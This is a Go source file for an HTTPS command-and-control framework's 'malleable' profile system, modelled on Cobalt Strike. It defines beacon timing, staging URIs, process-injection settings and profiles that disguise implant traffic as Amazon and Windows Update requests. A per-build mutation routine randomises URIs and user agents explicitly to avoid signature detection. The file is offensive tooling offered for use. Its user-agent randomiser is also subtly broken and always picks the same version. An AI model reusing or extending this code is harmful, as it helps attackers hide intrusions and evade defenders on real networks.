package malleable

import (
	"encoding/json"
	"fmt"
	"math/rand"
	"os"
	"strings"
	"time"
)

// Profile defines the traffic shaping configuration for HTTPS C2.
// Mirrors Cobalt Strike malleable C2 concepts with extensions for
// polymorphic per-build variation.
type Profile struct {
	Name        string       `json:"name"`
	Description string       `json:"description"`
	SleepTime   int          `json:"sleep_time"`     // Default sleep in seconds
	Jitter      int          `json:"jitter"`          // Jitter percentage (0-99)
	UserAgent   string       `json:"user_agent"`
	HTTPGet     HTTPBlock    `json:"http_get"`
	HTTPPost    HTTPBlock    `json:"http_post"`
	HTTPStager  HTTPBlock    `json:"http_stager"`
	SpawnTo     SpawnConfig  `json:"spawn_to"`
	ProcessInj  ProcInject   `json:"process_inject"`
	SSLConfig   SSLConfig    `json:"ssl_config"`
	DNSConfig   DNSConfig    `json:"dns_config"`
	Variants    []string     `json:"variants"`        // Names of variant profiles to randomize
}

type HTTPBlock struct {
	URI           []string          `json:"uri"`
	Verb          string            `json:"verb"`
	Headers       map[string]string `json:"headers"`
	Parameters    map[string]string `json:"parameters"`
	Body          BodyTransform     `json:"body"`
	ServerOutput  ServerTransform   `json:"server_output"`
}

type BodyTransform struct {
	Prepend   string `json:"prepend"`
	Append    string `json:"append"`
	Parameter string `json:"parameter"` // Parameter name for data
	Base64    bool   `json:"base64"`
	Mask      bool   `json:"mask"` // XOR mask with random key
	MaskKey   int    `json:"mask_key,omitempty"`
	NetBIOS   bool   `json:"netbios"` // NetBIOS encode
}

type ServerTransform struct {
	Headers   map[string]string `json:"headers"`
	Prepend   string            `json:"prepend"`
	Append    string            `json:"append"`
	Base64    bool              `json:"base64"`
	Mask      bool              `json:"mask"`
	MaskKey   int               `json:"mask_key,omitempty"`
}

type SpawnConfig struct {
	X86 string `json:"x86"`
	X64 string `json:"x64"`
}

type ProcInject struct {
	AllocType      string   `json:"alloc_type"`       // VirtualAlloc, NtMapViewOfSection
	ExecuteType    string   `json:"execute_type"`     // CreateThread, NtQueueApcThread, SetThreadContext
	MinAlloc       int      `json:"min_alloc"`
	UseSyscalls    bool     `json:"use_syscalls"`
	BofAllocType   string   `json:"bof_alloc_type"`
	TransformX86   []string `json:"transform_x86"`    // Prepend instructions
	TransformX64   []string `json:"transform_x64"`
}

type SSLConfig struct {
	SelfSigned    bool   `json:"self_signed"`
	Keystore      string `json:"keystore"`
	Password      string `json:"password"`
	ValidityDays  int    `json:"validity_days"`
	CN            string `json:"cn"`
	Organization  string `json:"organization"`
}

type DNSConfig struct {
	Beacon      string `json:"beacon"`       // Record type for beacons: A, AAAA, TXT
	GetA        string `json:"get_a"`        // Subdomain prefix for A lookups
	GetAAAA     string `json:"get_aaaa"`
	GetTXT      string `json:"get_txt"`
	PutMetadata string `json:"put_metadata"` // Subdomain prefix for metadata
	PutOutput   string `json:"put_output"`
	MaxDNS      int    `json:"max_dns"`      // Max DNS name length
}

// LoadProfile loads a malleable profile from a JSON file.
func LoadProfile(path string) (*Profile, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, fmt.Errorf("read profile: %w", err)
	}

	var p Profile
	if err := json.Unmarshal(data, &p); err != nil {
		return nil, fmt.Errorf("parse profile: %w", err)
	}

	if err := p.Validate(); err != nil {
		return nil, fmt.Errorf("invalid profile: %w", err)
	}

	return &p, nil
}

// Validate checks profile for consistency.
func (p *Profile) Validate() error {
	if p.Name == "" {
		return fmt.Errorf("profile name required")
	}
	if p.SleepTime <= 0 {
		return fmt.Errorf("sleep_time must be positive")
	}
	if p.Jitter < 0 || p.Jitter > 99 {
		return fmt.Errorf("jitter must be 0-99")
	}
	if len(p.HTTPGet.URI) == 0 {
		return fmt.Errorf("http_get.uri required")
	}
	if len(p.HTTPPost.URI) == 0 {
		return fmt.Errorf("http_post.uri required")
	}
	return nil
}

// SelectURI picks a random URI from the configured list.
func (b *HTTPBlock) SelectURI() string {
	if len(b.URI) == 0 {
		return "/"
	}
	return b.URI[rand.Intn(len(b.URI))]
}

// ComputeSleep returns the actual sleep duration with jitter applied.
func (p *Profile) ComputeSleep() time.Duration {
	base := time.Duration(p.SleepTime) * time.Second
	if p.Jitter == 0 {
		return base
	}
	jitterRange := float64(base) * float64(p.Jitter) / 100.0
	jitter := time.Duration(rand.Float64()*jitterRange*2 - jitterRange)
	result := base + jitter
	if result < time.Second {
		result = time.Second
	}
	return result
}

// GenerateHeaders returns request headers for a given block, with randomization.
func (b *HTTPBlock) GenerateHeaders(userAgent string) map[string]string {
	headers := make(map[string]string)
	for k, v := range b.Headers {
		headers[k] = v
	}
	if userAgent != "" {
		headers["User-Agent"] = userAgent
	}
	return headers
}

// BuiltinProfiles returns a set of pre-made profiles.
func BuiltinProfiles() map[string]*Profile {
	profiles := make(map[string]*Profile)

	profiles["default"] = &Profile{
		Name:      "default",
		SleepTime: 60,
		Jitter:    20,
		UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
		HTTPGet: HTTPBlock{
			URI:  []string{"/api/v1/status", "/cdn/check", "/assets/verify"},
			Verb: "GET",
			Headers: map[string]string{
				"Accept":          "application/json",
				"Accept-Language": "en-US,en;q=0.9",
			},
			Body: BodyTransform{Base64: true, Parameter: "token"},
			ServerOutput: ServerTransform{
				Headers: map[string]string{
					"Content-Type":  "application/json",
					"Cache-Control": "no-cache",
				},
				Base64: true,
			},
		},
		HTTPPost: HTTPBlock{
			URI:  []string{"/api/v1/telemetry", "/cdn/upload", "/assets/sync"},
			Verb: "POST",
			Headers: map[string]string{
				"Content-Type": "application/json",
			},
			Body: BodyTransform{Base64: true},
			ServerOutput: ServerTransform{
				Headers: map[string]string{
					"Content-Type": "application/json",
				},
			},
		},
		HTTPStager: HTTPBlock{
			URI:  []string{"/api/v1/update", "/cdn/pkg"},
			Verb: "GET",
		},
	}

	profiles["amazon"] = &Profile{
		Name:      "amazon",
		SleepTime: 30,
		Jitter:    37,
		UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
		HTTPGet: HTTPBlock{
			URI:  []string{"/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords="},
			Verb: "GET",
			Headers: map[string]string{
				"Host":   "www.amazon.com",
				"Accept": "*/*",
			},
			Body: BodyTransform{Base64: true, Parameter: "session-token"},
			ServerOutput: ServerTransform{
				Headers: map[string]string{
					"Content-Type":   "text/html; charset=UTF-8",
					"Server":         "Server",
					"x-amz-id-1":    "THKUYEZKCKPGY5T42PZT",
					"x-amz-id-2":    "a21y+eRPpczKhsGGHMYmoSB0/h/4",
				},
				Prepend: "<!DOCTYPE html><html><head><title>Amazon.com</title></head><body>",
				Append:  "</body></html>",
				Base64:  true,
			},
		},
		HTTPPost: HTTPBlock{
			URI:  []string{"/N4215/adj/amzn.us.sr.aps"},
			Verb: "POST",
			Headers: map[string]string{
				"Host":         "www.amazon.com",
				"Content-Type": "text/xml",
			},
			Body: BodyTransform{Base64: true},
			ServerOutput: ServerTransform{
				Headers: map[string]string{
					"Content-Type": "text/html; charset=UTF-8",
					"Server":       "Server",
				},
			},
		},
		HTTPStager: HTTPBlock{
			URI:  []string{"/gp/product/"},
			Verb: "GET",
		},
	}

	profiles["microsoft"] = &Profile{
		Name:      "microsoft",
		SleepTime: 45,
		Jitter:    25,
		UserAgent: "Microsoft BITS/7.8",
		HTTPGet: HTTPBlock{
			URI:  []string{"/windowsupdate/v6/default.aspx", "/msdownload/update/v3/static/"},
			Verb: "GET",
			Headers: map[string]string{
				"Host":   "download.windowsupdate.com",
				"Accept": "*/*",
			},
			Body: BodyTransform{Base64: true, Parameter: "id"},
			ServerOutput: ServerTransform{
				Headers: map[string]string{
					"Content-Type": "application/octet-stream",
					"Server":       "Microsoft-IIS/10.0",
				},
			},
		},
		HTTPPost: HTTPBlock{
			URI:  []string{"/windowsupdate/v6/reportevent.aspx"},
			Verb: "POST",
			Headers: map[string]string{
				"Host":         "download.windowsupdate.com",
				"Content-Type": "application/x-www-form-urlencoded",
			},
			Body: BodyTransform{Base64: true},
			ServerOutput: ServerTransform{
				Headers: map[string]string{
					"Content-Type": "text/html",
					"Server":       "Microsoft-IIS/10.0",
				},
			},
		},
		HTTPStager: HTTPBlock{
			URI:  []string{"/msdownload/update/"},
			Verb: "GET",
		},
	}

	return profiles
}

// MutateForBuild creates a unique variant of the profile for a specific build.
// Randomizes URIs, parameters, headers to prevent signature matching.
func (p *Profile) MutateForBuild(seed int64) *Profile {
	r := rand.New(rand.NewSource(seed))
	mutated := *p

	// Randomize URI paths by appending random segments
	mutated.HTTPGet.URI = mutateURIs(p.HTTPGet.URI, r)
	mutated.HTTPPost.URI = mutateURIs(p.HTTPPost.URI, r)

	// Randomize User-Agent version numbers
	mutated.UserAgent = mutateUserAgent(p.UserAgent, r)

	return &mutated
}

func mutateURIs(uris []string, r *rand.Rand) []string {
	suffixes := []string{
		"/", "/v2", "/v3", "/check", "/status", "/health",
		"/data", "/sync", "/update", "/verify", "/config",
	}
	result := make([]string, len(uris))
	for i, uri := range uris {
		if r.Float32() < 0.3 {
			result[i] = uri + suffixes[r.Intn(len(suffixes))]
		} else {
			result[i] = uri
		}
	}
	return result
}

func mutateUserAgent(ua string, r *rand.Rand) string {
	// Replace Chrome version with a plausible recent version
	versions := []string{"125.0.0.0", "126.0.0.0", "127.0.0.0", "128.0.0.0"}
	for _, v := range versions {
		if strings.Contains(ua, "Chrome/") {
			ua = strings.Replace(ua, "Chrome/126.0.0.0", "Chrome/"+v, 1)
			break
		}
	}
	return ua
}
